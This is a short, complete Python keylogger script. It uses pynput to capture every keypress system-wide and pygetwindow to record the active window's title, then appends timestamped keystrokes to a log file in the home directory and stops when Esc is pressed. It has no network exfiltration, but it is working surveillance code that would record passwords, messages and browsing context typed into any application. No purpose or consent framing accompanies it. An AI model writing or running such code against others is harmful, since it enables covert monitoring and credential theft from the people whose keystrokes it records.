import pynput.keyboard
import pygetwindow as gw
import datetime
import os

last_window = ""

def write_to_log(key):
    global last_window
    target_path = os.path.expanduser("~/my_log.txt")
    directory = os.path.dirname(target_path)
    
    # Termination logic
    if key == pynput.keyboard.Key.esc:
        return False

    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        active_window = gw.getActiveWindow().title
    except:
        active_window = "Unknown"

    try:
        k = str(key.char)
    except AttributeError:
        k = str(key)

    # Primary path is user home directory
    if os.path.exists(directory):
        with open(target_path, "a") as f:
            if active_window != last_window:
                f.write(f"\n--- [Window: {active_window}] ---\n")
                last_window = active_window
            f.write(f"[{now}] {k}\n")
    
    # Fallback path is current working directory
    else:
        with open("my_log.txt", "a") as f:
            if active_window != last_window:
                f.write(f"\n--- [Window: {active_window}] ---\n")
                last_window = active_window
            f.write(f"[{now}] {k}\n")

# the execution block
with pynput.keyboard.Listener(on_press=write_to_log) as listener:
    listener.join()